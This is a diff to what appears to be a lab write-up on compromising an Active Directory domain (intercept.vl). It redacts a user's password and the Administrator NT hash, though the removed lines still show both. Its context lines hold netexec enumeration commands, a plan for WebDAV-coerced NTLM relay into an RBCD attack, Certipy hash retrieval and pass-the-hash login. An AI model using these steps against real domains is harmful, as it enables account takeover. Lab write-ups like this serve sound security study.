@@ -164,20 +164,17 @@ SMB         10.10.152.70    445    WS01             [+] intercept.vl\KATHRYN.SPE
 WEBDAV      10.10.152.70    445    WS01             WebClient Service enabled on: 10.10.152.70
 ```
 ```bash
-netexec ldap 10.10.152.69 -u 'KATHRYN.SPENCER' -p 'Chocolate1' -M maq
+netexec ldap 10.10.152.69 -u 'KATHRYN.SPENCER' -p 'REDACTED' -M maq
 SMB         10.10.152.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
-LDAP        10.10.152.69    389    DC01             [+] intercept.vl\KATHRYN.SPENCER:Chocolate1 
+LDAP        10.10.152.69    389    DC01             [+] intercept.vl\KATHRYN.SPENCER:REDACTED 
 MAQ         10.10.152.69    389    DC01             [*] Getting the MachineAccountQuota
 MAQ         10.10.152.69    389    DC01             MachineAccountQuota: 10
 ```
 
 ```bash
-netexec ldap 10.10.152.69 -u 'KATHRYN.SPENCER' -p 'Chocolate1' -M ldap-checker
+netexec ldap 10.10.152.69 -u 'KATHRYN.SPENCER' -p 'REDACTED' -M ldap-checker
 SMB         10.10.152.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
-LDAP        10.10.152.69    389    DC01             [+] intercept.vl\KATHRYN.SPENCER:Chocolate1 
-LDAP-CHE... 10.10.152.69    389    DC01             LDAP Signing NOT Enforced!
-LDAP-CHE... 10.10.152.69    389    DC01             LDAPS Channel Binding is set to "NEVER"
-```
+LDAP        10.10.152.69    389    DC01             [+] intercept.vl\KATHRYN.SPENCER:REDACTED
 So using WEBDAV Coercion, which use HTTP so NTLM authentication, we can relay authentication to the DC.
 
 Thanks to this we can perform a RBCD attack
@@ -369,7 +366,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@intercept.vl': aad3b435b51404eeaad3b435b51404ee:ad9[...]1f
 
-nxc ldap 10.10.152.69 -u 'Administrator' -H 'ad95c338a6cc5729ae7390acbe0ca91f'     
+nxc ldap 10.10.152.69 -u 'Administrator' -H 'ad[...]1f'     
 SMB         10.10.152.69    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
 LDAP        10.10.152.69    389    DC01             [+] intercept.vl\Administrator:ad9[...]1f (admin)
 ```
